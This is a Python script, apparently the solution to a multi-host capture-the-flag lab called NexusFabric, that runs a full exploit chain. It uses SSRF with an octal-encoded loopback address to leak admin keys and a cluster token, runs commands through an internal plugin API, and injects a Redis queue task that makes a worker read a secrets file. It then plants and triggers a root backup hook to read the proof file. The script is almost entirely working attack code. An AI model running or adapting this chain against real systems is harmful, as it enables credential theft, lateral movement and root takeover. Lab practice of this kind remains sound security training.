#!/usr/bin/env python3
import sys
import json
import time
import socket
import argparse
import urllib.request
import urllib.parse

def send_redis_command(sock, cmd):
    sock.sendall(cmd.encode('utf-8') + b"\r\n")
    return sock.recv(4096).decode('utf-8', errors='replace')

def run_exploit(target_ip, port=80):
    print(f"[*] Target: {target_ip}:{port}")
    
    # -------------------------------------------------------------------------
    # 1. Edge Gateway SSRF: Leak cluster configuration
    # -------------------------------------------------------------------------
    print("[*] Probing webhook diagnostics endpoint for SSRF...")
    webhook_url = f"http://{target_ip}:{port}/api/v1/webhook/test"
    ssrf_target = "http://0177.0.0.1:8081/internal/config"
    
    post_body = json.dumps({"url": ssrf_target}).encode('utf-8')
    req = urllib.request.Request(
        webhook_url,
        data=post_body,
        headers={"Content-Type": "application/json"}
    )
    
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode('utf-8'))
            preview_json = json.loads(data.get("preview", "{}"))
    except Exception as e:
        print(f"[-] SSRF probe failed: {e}")
        sys.exit(1)
        
    admin_key = preview_json.get("admin_credentials", {}).get("admin_api_key")
    cluster_token = preview_json.get("admin_credentials", {}).get("cluster_token")
    broker_ip = preview_json.get("mesh_cluster", {}).get("broker_host", "10.211.55.11")
    core_ip = preview_json.get("mesh_cluster", {}).get("core_host", "10.211.55.12")
    
    if not admin_key or not cluster_token:
        print("[-] Failed to retrieve cluster credentials via SSRF.")
        sys.exit(1)
        
    print(f"[+] Cluster credentials acquired (Admin Key: {admin_key[:12]}..., Broker: {broker_ip}, Core: {core_ip})")
    
    # -------------------------------------------------------------------------
    # 2. Local Flag Extraction via Internal Plugin SSRF RCE
    # -------------------------------------------------------------------------
    print("[*] Executing plugin command via SSRF to capture local.txt...")
    rce_target = f"http://0177.0.0.1:8081/api/v1/plugins/execute?key={admin_key}&command=cat+/home/nexus-app/local.txt"
    rce_body = json.dumps({"url": rce_target}).encode('utf-8')
    req_rce = urllib.request.Request(
        webhook_url,
        data=rce_body,
        headers={"Content-Type": "application/json"}
    )
    
    user_flag = None
    try:
        with urllib.request.urlopen(req_rce, timeout=10) as resp:
            data = json.loads(resp.read().decode('utf-8'))
            preview_res = json.loads(data.get("preview", "{}"))
            user_flag = preview_res.get("output", "").strip()
    except Exception as e:
        print(f"[-] Failed to execute plugin command: {e}")
        sys.exit(1)
        
    if not user_flag:
        print("[-] Could not parse user flag.")
        sys.exit(1)
        
    print(f"[+] User flag: {user_flag}")
    
    # -------------------------------------------------------------------------
    # 3. Redis Queue Task Injection on VM 2 (Broker)
    # -------------------------------------------------------------------------
    print(f"[*] Connecting to task broker on {broker_ip}:6379...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((broker_ip, 6379))
        
        # Authenticate
        auth_resp = send_redis_command(s, f"AUTH {cluster_token}")
        if "+OK" not in auth_resp:
            print(f"[-] Redis AUTH failed: {auth_resp.strip()}")
            sys.exit(1)
            
        # Push task to read upstream core credentials
        task_data = json.dumps({
            "action": "system_sync",
            "payload": {
                "command": "cat /opt/nexus-worker/secrets/core_access.json"
            }
        })
        send_redis_command(s, f"LPUSH nexus:tasks:queue {json.dumps(task_data)}")
        
        # Pop result
        raw_result = send_redis_command(s, "BRPOP nexus:tasks:results 5")
        s.close()
        
        # Parse output from Redis RESP
        maint_token = None
        for line in raw_result.split("\r\n"):
            if "{" in line and "maint_tok_" in line:
                task_res = json.loads(line)
                inner_cfg = json.loads(task_res.get("output", "{}"))
                maint_token = inner_cfg.get("maintenance_token")
                break
    except Exception as e:
        print(f"[-] Broker communication failed: {e}")
        sys.exit(1)
        
    if not maint_token:
        print("[-] Failed to recover core maintenance token from broker.")
        sys.exit(1)
        
    print(f"[+] Recovered core maintenance token: {maint_token}")
    
    # -------------------------------------------------------------------------
    # 4. Isolated Core RPC Backup Hook Injection on VM 3 (Core)
    # -------------------------------------------------------------------------
    print(f"[*] Registering root pre-backup hook on {core_ip}:9090...")
    hook_url = f"http://{core_ip}:9090/api/v1/ledger/backup/config"
    hook_payload = json.dumps({
        "hook_content": "#!/usr/bin/env bash\ncat /root/proof.txt\n"
    }).encode('utf-8')
    
    req_hook = urllib.request.Request(
        hook_url,
        data=hook_payload,
        headers={
            "Content-Type": "application/json",
            "X-Nexus-Maintenance-Token": maint_token
        }
    )
    
    try:
        with urllib.request.urlopen(req_hook, timeout=10) as resp:
            pass
    except Exception as e:
        print(f"[-] Hook registration failed: {e}")
        sys.exit(1)
        
    # -------------------------------------------------------------------------
    # 5. Trigger Root Backup Execution
    # -------------------------------------------------------------------------
    print("[*] Triggering administrative backup orchestrator...")
    trigger_url = f"http://{core_ip}:9090/api/v1/ledger/backup/trigger"
    req_trigger = urllib.request.Request(
        trigger_url,
        data=b"{}",
        headers={
            "Content-Type": "application/json",
            "X-Nexus-Maintenance-Token": maint_token
        }
    )
    
    root_flag = None
    try:
        with urllib.request.urlopen(req_trigger, timeout=15) as resp:
            res_json = json.loads(resp.read().decode('utf-8'))
            output = res_json.get("output", "")
            for line in output.splitlines():
                line = line.strip()
                if len(line) == 32 and all(c in "0123456789abcdef" for c in line):
                    root_flag = line
                    break
    except Exception as e:
        print(f"[-] Trigger request failed: {e}")
        sys.exit(1)
        
    if not root_flag:
        print("[-] Failed to capture root flag.")
        sys.exit(1)
        
    print(f"[+] Root flag: {root_flag}")
    print("[*] Exploit chain completed successfully.")

def main():
    parser = argparse.ArgumentParser(description="NexusFabric Multi-Host Autonomous Exploit")
    parser.add_argument("target", help="Target IP address (nexus-edge)")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    args = parser.parse_args()

    run_exploit(args.target, args.port)

if __name__ == "__main__":
    main()
